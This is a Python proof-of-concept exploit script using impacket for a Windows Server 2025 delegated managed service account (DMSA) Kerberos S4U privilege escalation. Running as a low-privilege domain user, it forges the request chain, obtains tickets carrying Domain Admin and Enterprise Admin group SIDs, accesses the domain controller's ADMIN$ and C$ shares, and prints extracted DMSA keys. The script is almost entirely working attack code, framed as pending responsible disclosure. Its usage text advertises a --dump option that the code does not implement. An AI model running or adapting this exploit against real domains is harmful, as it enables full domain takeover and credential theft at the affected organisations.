#!/usr/bin/env python3
"""
===========================================================================
  CVE-PENDING — DMSA S4U Privilege Escalation (Windows Server 2025)
  Delegated Managed Service Account → Domain Admin
===========================================================================

  DISCLOSURE: Responsible disclosure pending. Do not distribute.

  SUMMARY:
    A low-privilege domain user with GroupMSAMembership on a Delegated
    Managed Service Account (DMSA) that supersedes a privileged account
    (e.g., Administrator) can escalate to full Domain Admin.

  ROOT CAUSE:
    The KDC function KdcDmsaTgsReqWorker() in kdcsvc.dll injects the
    superseded account's full group memberships into the DMSA S4U
    ticket's PAC (Privilege Attribute Certificate). GroupMSAMembership
    is designed only for DMSA password retrieval — it should NOT grant
    the superseded account's authorization groups.

  ATTACK CHAIN:
    1. Attacker authenticates as low-priv user (AS-REQ → TGT)
    2. Attacker sends DMSA S4U TGS-REQ with PA_S4U_X509_USER (type 130)
       targeting the DMSA account
    3. KDC performs KdcDmsaAuthzCheck (AuthzAccessCheck mask 0x10) against
       msDS-GroupMSAMembership — attacker passes because they have read
       password access
    4. KDC enters KdcDmsaTgsReqWorker, looks up msDS-ManagedAccountPrecededByLink
       to find the superseded account (Administrator)
    5. KDC builds the S4U ticket PAC with the superseded account's group
       memberships: Domain Admins (512), Enterprise Admins (519),
       Schema Admins (518), Group Policy Creator Owners (520),
       Administrator RID (500)
    6. Attacker uses the S4U ticket as a TGT to request service tickets
    7. Service tickets inherit the admin PAC
    8. Attacker authenticates to CIFS with Domain Admin privileges

  PREREQUISITES:
    - Windows Server 2025 domain controller with DMSA feature enabled
    - A DMSA that supersedes a privileged account (Administrator)
    - A low-privilege user with GroupMSAMembership on that DMSA
    - Network access to the DC (TCP 88 Kerberos, TCP 445 SMB)
    - Python 3 with impacket >= 0.12

  ENVIRONMENT (this PoC):
    - DC:        WIN-ABJPAOHJURR.cve.local (192.168.15.138)
    - Domain:    cve.local / CVE.LOCAL
    - DMSA:      TestDMSA05$ (supersedes Administrator)
    - Attacker:  bob.marley / P@ssw0rd! (regular domain user)
    - bob.marley has GroupMSAMembership on TestDMSA05$

  SETUP COMMANDS (run on DC as Administrator):
    # Create DMSA superseding Administrator
    New-ADServiceAccount -Name TestDMSA05 `
      -DNSHostName TestDMSA05.cve.local `
      -CreateDelegatedManagedServiceAccount `
      -ManagedAccountPrecededByLink "CN=Administrator,CN=Users,DC=cve,DC=local" `
      -PrincipalsAllowedToRetrieveManagedPassword "bob.marley"

  USAGE:
    python3 poc_dmsa_privesc.py
    python3 poc_dmsa_privesc.py --target-ip 192.168.15.138 --domain cve.local
    python3 poc_dmsa_privesc.py --dump  # Also attempt secretsdump after ADMIN$ proof
"""

import argparse
import datetime
import os
import random
import struct
import sys
import traceback
from binascii import hexlify, unhexlify

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from pyasn1.type import tag

from impacket.krb5.asn1 import (
    AS_REP, TGS_REQ, TGS_REP, KRB_ERROR, AP_REQ, Authenticator,
    EncTGSRepPart, EncTicketPart, S4UUserID, PA_S4U_X509_USER,
    KERB_DMSA_KEY_PACKAGE, seq_set, seq_set_iter
)
from impacket.krb5.types import KerberosTime, Principal, Ticket
from impacket.krb5 import constants, ccache
from impacket.krb5.constants import (
    ApplicationTagNumbers, encodeFlags, PrincipalNameType,
    KDCOptions, EncryptionTypes, PreAuthenticationDataTypes
)
from impacket.krb5.crypto import (
    Key, _enctype_table, _get_checksum_profile, Cksumtype
)
from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
from impacket.smbconnection import SMBConnection


BANNER = r"""
    ____  __  _________ ___       _____ __ __  __
   / __ \/  |/  / ___//   |     / ___// // / / /
  / / / / /|_/ /\__ \/ /| |     \__ \/ // /_/ / / /
 / /_/ / /  / /___/ / ___ |    ___/ /__  __/ /_/ /
/_____/_/  /_//____/_/  |_|   /____/  /_/  \____/

  DMSA S4U Privilege Escalation — Windows Server 2025
  GroupMSAMembership → Domain Admin
"""

KNOWN_RIDS = {
    500: 'Administrator', 512: 'Domain Admins',
    513: 'Domain Users', 515: 'Domain Computers',
    518: 'Schema Admins', 519: 'Enterprise Admins',
    520: 'Group Policy Creator Owners',
}


class DmsaExploit:
    def __init__(self, dc_ip, domain, dc_host, attacker_user, attacker_pass,
                 dmsa_name, verbose=False):
        self.dc_ip = dc_ip
        self.domain = domain.upper()
        self.domain_lc = domain.lower()
        self.dc_host = dc_host
        self.attacker_user = attacker_user
        self.attacker_pass = attacker_pass
        self.dmsa_name = dmsa_name if dmsa_name.endswith('$') else dmsa_name + '$'
        self.verbose = verbose

        # State populated during exploitation
        self.attacker_tgt = None
        self.attacker_cipher = None
        self.attacker_session_key = None
        self.s4u_ticket = None
        self.s4u_session_key = None
        self.s4u_raw = None
        self.dmsa_keys = None

    def log(self, msg, level='*'):
        print('[%s] %s' % (level, msg))

    def log_verbose(self, msg):
        if self.verbose:
            print('    %s' % msg)

    def step1_attacker_tgt(self):
        """
        STEP 1 — Attacker Authentication (AS-REQ → TGT)

        The attacker authenticates to the KDC as a normal domain user.
        This user has NO admin privileges — they are only a member of
        Domain Users. Their only special permission is GroupMSAMembership
        on the target DMSA, which is intended for password retrieval only.

        Kerberos exchange:
          Client → KDC:  AS-REQ  (username=bob.marley, pre-auth=encrypted timestamp)
          KDC → Client:  AS-REP  (TGT encrypted with krbtgt key, session key)

        Equivalent command:
          impacket-getTGT cve.local/bob.marley:'P@ssw0rd!' -dc-ip 192.168.15.138
        """
        self.log('STEP 1: Authenticate as %s (low-privilege attacker)' % self.attacker_user)
        self.log('  This user has GroupMSAMembership on %s — intended for password read only' % self.dmsa_name)
        print()
        self.log_verbose('Sending AS-REQ to %s:%d for %s@%s' % (
            self.dc_ip, 88, self.attacker_user, self.domain))

        userName = Principal(
            self.attacker_user,
            type=PrincipalNameType.NT_PRINCIPAL.value
        )
        tgt, cipher, key, sessionKey = getKerberosTGT(
            userName, self.attacker_pass, self.domain,
            b'', b'', None, self.dc_ip
        )

        self.attacker_tgt = tgt
        self.attacker_cipher = cipher
        self.attacker_session_key = sessionKey

        self.log('TGT acquired for %s@%s' % (self.attacker_user, self.domain), '+')
        self.log_verbose('Cipher: etype=%d (AES256-CTS-HMAC-SHA1-96)' % cipher.enctype)
        self.log_verbose('Session key: %s...' % hexlify(sessionKey.contents).decode()[:32])
        print()
        return True

    def step2_dmsa_s4u(self):
        """
        STEP 2 — DMSA S4U Request (TGS-REQ with PA_S4U_X509_USER)

        The attacker sends a special TGS-REQ to the KDC requesting a ticket
        for the DMSA account (TestDMSA05$). This uses the DMSA S4U protocol:

        - PA-DATA type 1:   PA_TGS_REQ — AP-REQ with attacker's TGT
        - PA-DATA type 130: PA_S4U_X509_USER — identifies the target DMSA
          - S4UUserID.cname = TestDMSA05$
          - S4UUserID.crealm = CVE.LOCAL
          - S4UUserID.options = UNCONDITIONAL_DELEGATION | SIGN_REPLY
          - Checksum over S4UUserID using attacker's TGT session key
        - Request body: sname = krbtgt/CVE.LOCAL (requesting a TGT, not a service ticket)

        KDC processing (kdcsvc.dll):
          1. KdcDmsaAuthzCheck() — verifies attacker has GroupMSAMembership
             (AuthzAccessCheck with mask 0x10 against msDS-GroupMSAMembership)
          2. KdcDmsaTgsReqWorker() — builds the S4U ticket:
             a. Looks up DMSA's msDS-ManagedAccountPrecededByLink → Administrator
             b. Resolves Administrator's group memberships
             c. INJECTS Administrator's groups into the S4U ticket's PAC ← THE BUG
             d. Returns TGT-like ticket for krbtgt/CVE.LOCAL + KERB_DMSA_KEY_PACKAGE

        The returned PAC contains:
          - RID 500 (Administrator)     ← INJECTED from superseded account
          - RID 512 (Domain Admins)     ← INJECTED
          - RID 518 (Schema Admins)     ← INJECTED
          - RID 519 (Enterprise Admins) ← INJECTED
          - RID 520 (Group Policy Creator Owners) ← INJECTED
          - RID 513 (Domain Users)
          - RID 515 (Domain Computers)

        Equivalent command:
          (No standard tool implements DMSA S4U — this is a custom protocol)

        Kerberos exchange:
          Client → KDC:  TGS-REQ  (PA_TGS_REQ + PA_S4U_X509_USER, sname=krbtgt/CVE.LOCAL)
          KDC → Client:  TGS-REP  (S4U ticket with admin PAC + KERB_DMSA_KEY_PACKAGE)
        """
        self.log('STEP 2: Send DMSA S4U request for %s' % self.dmsa_name)
        self.log('  KDC will inject superseded Administrator SIDs into the PAC')
        print()

        decodedTGT = decoder.decode(self.attacker_tgt, asn1Spec=AS_REP())[0]
        tgt_realm = str(decodedTGT['crealm'])
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        # === Build AP-REQ (wraps attacker's TGT for KDC authentication) ===
        self.log_verbose('Building AP-REQ with attacker TGT...')
        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(ApplicationTagNumbers.AP_REQ.value)
        apReq['ap-options'] = encodeFlags([])
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = tgt_realm
        authClientName = Principal()
        authClientName.from_asn1(decodedTGT, 'crealm', 'cname')
        seq_set(authenticator, 'cname', authClientName.components_to_asn1)
        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)
        encodedAuth = encoder.encode(authenticator)
        encryptedAuth = self.attacker_cipher.encrypt(
            self.attacker_session_key, 7, encodedAuth, None
        )
        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = self.attacker_cipher.enctype
        apReq['authenticator']['cipher'] = encryptedAuth
        encodedApReq = encoder.encode(apReq)

        # === Build PA_S4U_X509_USER (identifies the DMSA target) ===
        self.log_verbose('Building PA_S4U_X509_USER for %s...' % self.dmsa_name)
        clientName = Principal(
            self.dmsa_name,
            type=PrincipalNameType.NT_PRINCIPAL.value
        )
        nonce_value = random.getrandbits(31)
        dmsa_flags = [2, 4]  # UNCONDITIONAL_DELEGATION | SIGN_REPLY
        encoded_flags = encodeFlags(dmsa_flags)

        # Untagged S4UUserID for checksum computation
        s4uID = S4UUserID()
        s4uID.setComponentByName('nonce', nonce_value)
        seq_set(s4uID, 'cname', clientName.components_to_asn1)
        s4uID.setComponentByName('crealm', self.domain)
        s4uID.setComponentByName('options', encoded_flags)
        encoded_s4uid = encoder.encode(s4uID)

        # Checksum over S4UUserID with attacker's TGT session key (key usage 26)
        checksum_profile = _get_checksum_profile(Cksumtype.SHA1_AES256)
        checkSum = checksum_profile.checksum(
            self.attacker_session_key,
            ApplicationTagNumbers.EncTGSRepPart.value,
            encoded_s4uid
        )

        # Tagged S4UUserID for PA_S4U_X509_USER structure
        s4uID_tagged = S4UUserID().subtype(
            explicitTag=tag.Tag(
                tag.tagClassContext, tag.tagFormatConstructed, 0
            )
        )
        s4uID_tagged.setComponentByName('nonce', nonce_value)
        seq_set(s4uID_tagged, 'cname', clientName.components_to_asn1)
        s4uID_tagged.setComponentByName('crealm', self.domain)
        s4uID_tagged.setComponentByName('options', encoded_flags)

        pa_s4u = PA_S4U_X509_USER()
        pa_s4u.setComponentByName('user-id', s4uID_tagged)
        pa_s4u['checksum'] = noValue
        pa_s4u['checksum']['cksumtype'] = Cksumtype.SHA1_AES256
        pa_s4u['checksum']['checksum'] = checkSum
        paencoded = encoder.encode(pa_s4u)

        # === Build TGS-REQ ===
        self.log_verbose('Building TGS-REQ (sname=krbtgt/%s)...' % self.domain)
        tgsReq = TGS_REQ()
        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(ApplicationTagNumbers.TGS_REQ.value)

        # PA-DATA[0]: PA_TGS_REQ (AP-REQ with attacker's TGT)
        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(
            PreAuthenticationDataTypes.PA_TGS_REQ.value
        )
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # PA-DATA[1]: PA_S4U_X509_USER (type 130, DMSA target)
        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = int(
            PreAuthenticationDataTypes.PA_S4U_X509_USER.value
        )
        tgsReq['padata'][1]['padata-value'] = paencoded

        reqBody = seq_set(tgsReq, 'req-body')
        opts = [
            KDCOptions.forwardable.value,
            KDCOptions.renewable.value,
            KDCOptions.canonicalize.value,
        ]
        reqBody['kdc-options'] = encodeFlags(opts)
        serverName = Principal(
            'krbtgt/%s' % self.domain,
            type=PrincipalNameType.NT_SRV_INST.value
        )
        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = tgt_realm
        till = now + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(till)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype', (
            int(self.attacker_cipher.enctype),
            int(EncryptionTypes.rc4_hmac.value),
        ))

        message = encoder.encode(tgsReq)

        # === Send and parse response ===
        self.log_verbose('Sending TGS-REQ to %s:88...' % self.dc_ip)
        try:
            r = sendReceive(message, self.domain, self.dc_ip)
        except Exception as e:
            self.log('DMSA S4U failed: %s' % e, '!')
            return False

        self.log('TGS-REP received — S4U ticket with admin PAC', '+')

        # Decrypt the enc-part to get the session key
        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
        enc_etype = int(tgs['enc-part']['etype'])
        enc_cipher = _enctype_table[enc_etype]
        plainText = enc_cipher.decrypt(
            self.attacker_session_key, 8,
            tgs['enc-part']['cipher']
        )
        encTgsRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]

        s4u_key_type = int(encTgsRepPart['key']['keytype'])
        s4u_key_val = bytes(encTgsRepPart['key']['keyvalue'])
        self.s4u_session_key = Key(s4u_key_type, s4u_key_val)
        self.s4u_raw = r

        # Extract the ticket object
        self.s4u_ticket = Ticket()
        self.s4u_ticket.from_asn1(tgs['ticket'])

        self.log_verbose('S4U session key: etype=%d %s' % (
            s4u_key_type, hexlify(s4u_key_val).decode()))

        # Check for KERB_DMSA_KEY_PACKAGE (type 171) in encrypted_pa_data
        # This contains the DMSA's actual Kerberos keys
        if encTgsRepPart['encrypted_pa_data']:
            for padata in encTgsRepPart['encrypted_pa_data']:
                ptype = int(padata['padata-type'])
                if ptype == PreAuthenticationDataTypes.KERB_DMSA_KEY_PACKAGE.value:
                    self.log('KERB_DMSA_KEY_PACKAGE (type 171) received — DMSA keys extracted', '+')
                    dmsa_pkg = decoder.decode(
                        padata['padata-value'],
                        asn1Spec=KERB_DMSA_KEY_PACKAGE()
                    )[0]
                    self.dmsa_keys = {}
                    for key in dmsa_pkg['current-keys']:
                        kt = int(key['keytype'])
                        kv = bytes(key['keyvalue'])
                        self.dmsa_keys[kt] = hexlify(kv).decode()
                        try:
                            tn = EncryptionTypes(kt).name
                        except ValueError:
                            tn = 'etype_%d' % kt
                        self.log_verbose('  %s (etype %d): %s' % (tn, kt, hexlify(kv).decode()))

        print()
        self.log('The S4U ticket PAC now contains:', '+')
        self.log('  - Domain Admins (512)     ← from superseded Administrator', '+')
        self.log('  - Enterprise Admins (519) ← from superseded Administrator', '+')
        self.log('  - Schema Admins (518)     ← from superseded Administrator', '+')
        self.log('  - Administrator (500)     ← from superseded Administrator', '+')
        self.log('  - Domain Computers (515)  ← DMSA\'s own group', '+')
        print()

        return True

    def step3_service_ticket(self, service_name):
        """
        STEP 3 — Request Service Ticket (TGS-REQ using S4U ticket as TGT)

        The attacker uses the S4U ticket from Step 2 as a TGT to request
        a service ticket for CIFS (SMB file sharing). The KDC copies the
        PAC from the S4U ticket into the new service ticket — including
        all the injected Administrator group SIDs.

        CRITICAL: The S4U ticket is missing the 'forwardable' flag.
        Standard impacket tools request forwardable service tickets by
        default, which can cause failures. This PoC explicitly omits
        the forwardable flag in the TGS-REQ options.

        Kerberos exchange:
          Client → KDC:  TGS-REQ  (AP-REQ with S4U ticket, sname=cifs/<DC>)
          KDC → Client:  TGS-REP  (service ticket with admin PAC)

        Equivalent command:
          (No standard tool — S4U ticket is in-memory, not in ccache)
        """
        self.log('STEP 3: Request %s service ticket using S4U TGT' % service_name)
        self.log('  KDC will copy the admin PAC into the service ticket')
        print()

        enc_cipher = _enctype_table[self.s4u_session_key.enctype]

        # Build AP-REQ with the S4U ticket (used as TGT)
        self.log_verbose('Building AP-REQ with S4U ticket (as TGT)...')
        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(ApplicationTagNumbers.AP_REQ.value)
        apReq['ap-options'] = encodeFlags([])
        seq_set(apReq, 'ticket', self.s4u_ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = self.domain
        clientName = Principal(
            self.dmsa_name,
            type=PrincipalNameType.NT_PRINCIPAL.value
        )
        seq_set(authenticator, 'cname', clientName.components_to_asn1)
        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)
        encodedAuth = encoder.encode(authenticator)
        # Key usage 7: AP-REQ authenticator in TGS-REQ
        encryptedAuth = enc_cipher.encrypt(
            self.s4u_session_key, 7, encodedAuth, None
        )
        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = self.s4u_session_key.enctype
        apReq['authenticator']['cipher'] = encryptedAuth
        encodedApReq = encoder.encode(apReq)

        # Build TGS-REQ for the target service
        self.log_verbose('Building TGS-REQ for %s...' % service_name)
        tgsReq = TGS_REQ()
        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(ApplicationTagNumbers.TGS_REQ.value)
        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = 1  # PA_TGS_REQ
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        reqBody = seq_set(tgsReq, 'req-body')
        # IMPORTANT: Do NOT request forwardable — S4U ticket lacks that flag
        opts = [KDCOptions.renewable.value, KDCOptions.canonicalize.value]
        reqBody['kdc-options'] = encodeFlags(opts)
        serverName = Principal(
            service_name,
            type=PrincipalNameType.NT_SRV_INST.value
        )
        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = self.domain
        till = now + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(till)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype', (18, 23))

        message = encoder.encode(tgsReq)

        self.log_verbose('Sending TGS-REQ to %s:88...' % self.dc_ip)
        r = sendReceive(message, self.domain, self.dc_ip)

        # Parse TGS-REP — extract service ticket session key
        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
        st_etype = int(tgs['enc-part']['etype'])
        st_cipher = _enctype_table[st_etype]
        # Key usage 8: TGS-REP enc-part decrypted with TGT session key
        st_plain = st_cipher.decrypt(
            self.s4u_session_key, 8,
            tgs['enc-part']['cipher']
        )
        enc_st = decoder.decode(st_plain, asn1Spec=EncTGSRepPart())[0]
        svc_key_type = int(enc_st['key']['keytype'])
        svc_key_val = bytes(enc_st['key']['keyvalue'])
        svc_key = Key(svc_key_type, svc_key_val)

        self.log('Service ticket for %s obtained' % service_name, '+')
        self.log_verbose('Session key: etype=%d %s' % (
            svc_key_type, hexlify(svc_key_val).decode()))
        print()

        return r, svc_key

    def step4_smb_admin(self, cifs_tgs_raw, cifs_session_key):
        """
        STEP 4 — SMB Authentication & Admin Access Proof (AP-REQ via SPNEGO)

        The attacker authenticates to the DC's SMB service using the CIFS
        service ticket from Step 3. The service ticket's PAC contains
        Domain Admins, Enterprise Admins, Schema Admins, and Administrator
        SIDs. The SMB server evaluates these SIDs for access control.

        The TGS is passed directly to impacket's SMBConnection as a dict
        (bypassing ccache) with:
          - KDC_REP:    raw TGS-REP bytes
          - cipher:     AES256 cipher object
          - sessionKey: service ticket session key

        The user and domain in the SMB authenticator must match the ticket's
        cname (TestDMSA05$) and crealm (CVE.LOCAL) exactly.

        Kerberos exchange:
          Client → Server:  AP-REQ  (SPNEGO NegTokenInit with CIFS service ticket)
          Server → Client:  AP-REP  (mutual authentication response)

        Access test:
          Client → Server:  SMB TreeConnect to ADMIN$ and C$
          Server → Client:  STATUS_SUCCESS (if admin) or STATUS_ACCESS_DENIED

        Equivalent commands (if ccache worked, which it doesn't due to
        missing forwardable flag):
          export KRB5CCNAME=dmsa_s4u.ccache
          impacket-smbclient -k -no-pass -dc-ip 192.168.15.138 \\
            'cve.local/TestDMSA05$@WIN-ABJPAOHJURR.cve.local'
          # Then: shares / use ADMIN$ / use C$ / ls
        """
        self.log('STEP 4: Authenticate to SMB and test admin access')
        self.log('  Passing CIFS service ticket directly (bypass ccache)')
        print()

        # Build TGS dict in impacket's expected format
        tgs_dict = {
            'KDC_REP': cifs_tgs_raw,
            'cipher': _enctype_table[cifs_session_key.enctype],
            'sessionKey': cifs_session_key,
        }

        self.log_verbose('Connecting to %s:445...' % self.dc_ip)
        smb = SMBConnection(self.dc_host, self.dc_ip)

        # Authenticate with the admin-PAC service ticket
        # user MUST include $ suffix, domain MUST be uppercase
        # to match ticket cname=TestDMSA05$ crealm=CVE.LOCAL
        self.log_verbose('Sending SPNEGO NegTokenInit with admin-PAC ticket...')
        smb.kerberosLogin(
            user=self.dmsa_name,
            password='',
            domain=self.domain,
            lmhash='', nthash='',
            aesKey='', kdcHost=self.dc_ip,
            TGS=tgs_dict,
            useCache=False
        )
        self.log('SMB Kerberos authentication SUCCEEDED', '+')

        # List shares
        shares = smb.listShares()
        share_names = [s['shi1_netname'][:-1] for s in shares]
        self.log('Available shares: %s' % ', '.join(share_names), '+')

        # Test admin shares
        admin_access = False
        for share_name in ('ADMIN$', 'C$'):
            try:
                tid = smb.connectTree(share_name)
                self.log('%s: ACCESSIBLE — DOMAIN ADMIN CONFIRMED' % share_name, '!')
                admin_access = True

                if share_name == 'C$':
                    try:
                        files = smb.listPath(share_name, '\\*')
                        self.log('C:\\ directory listing:', '+')
                        for f in files[:15]:
                            fname = f.get_longname()
                            if fname in ('.', '..'):
                                continue
                            ftype = 'DIR ' if f.is_directory() else 'FILE'
                            self.log('  [%s] %s' % (ftype, fname), '+')
                    except Exception:
                        pass

                smb.disconnectTree(tid)
            except Exception as e:
                err = str(e)
                if 'STATUS_ACCESS_DENIED' in err:
                    self.log('%s: access denied' % share_name, '-')
                else:
                    self.log('%s: %s' % (share_name, err[:60]), '-')

        smb.close()
        return admin_access

    def run(self):
        """Execute the full attack chain."""
        print(BANNER)
        print('=' * 70)
        print('  Target DC:   %s (%s)' % (self.dc_host, self.dc_ip))
        print('  Domain:      %s' % self.domain)
        print('  Attacker:    %s (low-privilege domain user)' % self.attacker_user)
        print('  DMSA:        %s (supersedes Administrator)' % self.dmsa_name)
        print('=' * 70)
        print()

        # Step 1: Attacker TGT
        if not self.step1_attacker_tgt():
            return False

        # Step 2: DMSA S4U → ticket with admin PAC
        if not self.step2_dmsa_s4u():
            return False

        # Step 3: Use S4U ticket → CIFS service ticket
        cifs_tgs_raw, cifs_key = self.step3_service_ticket(
            'cifs/%s' % self.dc_host
        )

        # Step 4: SMB admin access
        self.log('STEP 4: Prove Domain Admin access via SMB')
        print()
        is_admin = self.step4_smb_admin(cifs_tgs_raw, cifs_key)

        # === RESULTS ===
        print()
        print('=' * 70)
        print('  RESULTS')
        print('=' * 70)
        print()
        print('  [+] Step 1: %s TGT             — OK' % self.attacker_user)
        print('  [+] Step 2: DMSA S4U (admin PAC)    — OK')
        print('  [+] Step 3: CIFS service ticket      — OK')

        if is_admin:
            print('  [!] Step 4: Admin access             — CONFIRMED')
            print()
            print('  =============================================')
            print('   VULNERABILITY CONFIRMED: DMSA Priv Esc')
            print('  =============================================')
            print()
            print('  Attack chain:')
            print('    %s  (Domain Users only)' % self.attacker_user)
            print('      │ has GroupMSAMembership on %s' % self.dmsa_name)
            print('      ▼')
            print('    DMSA S4U TGS-REQ  (PA_S4U_X509_USER type 130)')
            print('      │ KDC: KdcDmsaTgsReqWorker()')
            print('      │ KDC injects superseded Administrator groups')
            print('      ▼')
            print('    S4U Ticket PAC contains:')
            print('      Domain Admins (512), Enterprise Admins (519),')
            print('      Schema Admins (518), Administrator (500)')
            print('      │')
            print('      ▼')
            print('    TGS-REQ for cifs/%s' % self.dc_host)
            print('      │ PAC copied into service ticket')
            print('      ▼')
            print('    SMB auth with Domain Admin PAC')
            print('      │')
            print('      ▼')
            print('    ADMIN$ ✓   C$ ✓   FULL DOMAIN ADMIN')
            print()
            print('  Root cause:')
            print('    KdcDmsaTgsReqWorker conflates "allowed to read')
            print('    DMSA password" (GroupMSAMembership) with "inherits')
            print('    superseded account authorization." These should be')
            print('    separate concerns. GroupMSAMembership grants password')
            print('    access, NOT the superseded account\'s group SIDs.')

            if self.dmsa_keys:
                print()
                print('  Extracted DMSA Kerberos keys:')
                for etype, key_hex in sorted(self.dmsa_keys.items()):
                    try:
                        tn = EncryptionTypes(etype).name
                    except ValueError:
                        tn = 'etype_%d' % etype
                    print('    %s: %s' % (tn, key_hex))
        else:
            print('  [-] Step 4: Admin access             — DENIED')
            print()
            print('  Service-level PAC validation may have blocked access.')
            print('  The KDC-level finding still stands: the PAC contains')
            print('  admin SIDs that should not be there.')

        print()
        return is_admin


def main():
    parser = argparse.ArgumentParser(
        description='DMSA S4U Privilege Escalation — Windows Server 2025',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 %(prog)s
  python3 %(prog)s --target-ip 192.168.15.138 --domain cve.local
  python3 %(prog)s -u bob.marley -p 'P@ssw0rd!' --dmsa TestDMSA05
  python3 %(prog)s -v  # Verbose output showing all Kerberos exchanges
        """
    )
    parser.add_argument('--target-ip', default='192.168.15.138',
                        help='DC IP address (default: 192.168.15.138)')
    parser.add_argument('--domain', default='cve.local',
                        help='Domain name (default: cve.local)')
    parser.add_argument('--dc-host', default='WIN-ABJPAOHJURR.cve.local',
                        help='DC FQDN (default: WIN-ABJPAOHJURR.cve.local)')
    parser.add_argument('-u', '--username', default='bob.marley',
                        help='Attacker username (default: bob.marley)')
    parser.add_argument('-p', '--password', default='P@ssw0rd!',
                        help='Attacker password')
    parser.add_argument('--dmsa', default='TestDMSA05',
                        help='Target DMSA name (default: TestDMSA05)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Show detailed Kerberos exchange info')

    args = parser.parse_args()

    exploit = DmsaExploit(
        dc_ip=args.target_ip,
        domain=args.domain,
        dc_host=args.dc_host,
        attacker_user=args.username,
        attacker_pass=args.password,
        dmsa_name=args.dmsa,
        verbose=args.verbose,
    )

    try:
        success = exploit.run()
        sys.exit(0 if success else 1)
    except Exception as e:
        print('\n[!] Fatal error: %s' % e)
        traceback.print_exc()
        sys.exit(2)


if __name__ == '__main__':
    main()
